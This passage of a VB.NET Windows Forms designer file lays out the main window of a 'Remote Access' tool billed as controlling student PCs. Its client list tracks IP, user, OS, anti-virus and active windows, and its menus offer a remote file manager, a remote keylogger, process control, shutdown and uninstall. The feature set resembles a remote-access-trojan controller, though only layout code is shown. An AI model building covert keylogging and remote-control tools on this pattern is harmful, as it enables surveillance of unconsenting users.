        Me.ColumnHeader2.Text = "IP"
        Me.ColumnHeader2.Width = 80
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Computer/User"
        Me.ColumnHeader3.Width = 119
        '
        'ColumnHeader6
        '
        Me.ColumnHeader6.Text = "OS"
        Me.ColumnHeader6.Width = 140
        '
        'ColumnHeader7
        '
        Me.ColumnHeader7.Text = "Anti Virus"
        Me.ColumnHeader7.Width = 80
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "Acitve Windows"
        Me.ColumnHeader5.Width = 170
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.CheckBox3)
        Me.GroupBox2.Controls.Add(Me.NumericUpDown1)
        Me.GroupBox2.Controls.Add(Me.CheckBox1)
        Me.GroupBox2.Controls.Add(Me.Label2)
        Me.GroupBox2.Controls.Add(Me.CheckBox2)
        Me.GroupBox2.Controls.Add(Me.Label1)
        Me.GroupBox2.Controls.Add(Me.TextBox1)
        Me.GroupBox2.Location = New System.Drawing.Point(1180, 455)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(115, 24)
        Me.GroupBox2.TabIndex = 25
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Settings"
        '
        'Label4
        '
        Me.Label4.BackColor = System.Drawing.Color.Green
        Me.Label4.Location = New System.Drawing.Point(-14, 34)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(1251, 10)
        Me.Label4.TabIndex = 32
        '
        'lblDescription
        '
        Me.lblDescription.AutoSize = True
        Me.lblDescription.ForeColor = System.Drawing.Color.White
        Me.lblDescription.Location = New System.Drawing.Point(69, 59)
        Me.lblDescription.Name = "lblDescription"
        Me.lblDescription.Size = New System.Drawing.Size(376, 19)
        Me.lblDescription.TabIndex = 63
        Me.lblDescription.Text = "That you can easily and fastiest control of each Student PC's"
        '
        'lblTitle
        '
        Me.lblTitle.AutoSize = True
        Me.lblTitle.Font = New System.Drawing.Font("Segoe UI Semibold", 14.0!)
        Me.lblTitle.ForeColor = System.Drawing.Color.LawnGreen
        Me.lblTitle.Location = New System.Drawing.Point(68, 25)
        Me.lblTitle.Name = "lblTitle"
        Me.lblTitle.Size = New System.Drawing.Size(141, 25)
        Me.lblTitle.TabIndex = 62
        Me.lblTitle.Text = "Remote Access"
        '
        'Label3
        '
        Me.Label3.BackColor = System.Drawing.Color.Green
        Me.Label3.Location = New System.Drawing.Point(-14, 469)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(1251, 10)
        Me.Label3.TabIndex = 64
        '
        'Label5
        '
        Me.Label5.BackColor = System.Drawing.Color.Green
        Me.Label5.Location = New System.Drawing.Point(1071, -1)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(10, 599)
        Me.Label5.TabIndex = 65
        '
        'Button1
        '
        Me.Button1.ForeColor = System.Drawing.Color.Black
        Me.Button1.Location = New System.Drawing.Point(1012, 10)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(128, 58)
        Me.Button1.TabIndex = 66
        Me.Button1.Text = "Close"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'frmMain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 17.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(1156, 531)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.Label5)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.lblDescription)
        Me.Controls.Add(Me.lblTitle)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.lbl1)
        Me.Controls.Add(Me.P1)
        Me.Controls.Add(Me.so)
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.L1)
        Me.Controls.Add(Me.c1)
        Me.Controls.Add(Me.c)
        Me.Controls.Add(Me.c2)
        Me.Controls.Add(Me.Button3)
        Me.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.ForeColor = System.Drawing.Color.White
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "frmMain"
        Me.Text = "frmMain"
        Me.ContextMenuStrip1.ResumeLayout(False)
        CType(Me.P1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.c, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ContextMenuStrip2.ResumeLayout(False)
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents lbl1 As System.Windows.Forms.Label
    Friend WithEvents so As System.Windows.Forms.Label
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RemoteFileMangerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteKayloggerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ProcessManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FunToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TextToSpechToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ComputerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents LogoffToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ShutdownToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CheckBox2 As System.Windows.Forms.CheckBox
    Friend WithEvents c1 As System.Windows.Forms.ComboBox
    Friend WithEvents c As System.Windows.Forms.NumericUpDown
    Friend WithEvents ii As System.Windows.Forms.ImageList
    Friend WithEvents c2 As System.Windows.Forms.ComboBox
    Friend WithEvents ExitToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents NotifyIcon1 As System.Windows.Forms.NotifyIcon
    Friend WithEvents ContextMenuStrip2 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents SdfghToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents L1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader6 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader7 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents NumericUpDown1 As System.Windows.Forms.NumericUpDown
    Friend WithEvents Button3 As System.Windows.Forms.Button
    Friend WithEvents CheckBox3 As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents P1 As System.Windows.Forms.PictureBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents lblDescription As System.Windows.Forms.Label
    Friend WithEvents lblTitle As System.Windows.Forms.Label
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents Button1 As System.Windows.Forms.Button
End Class
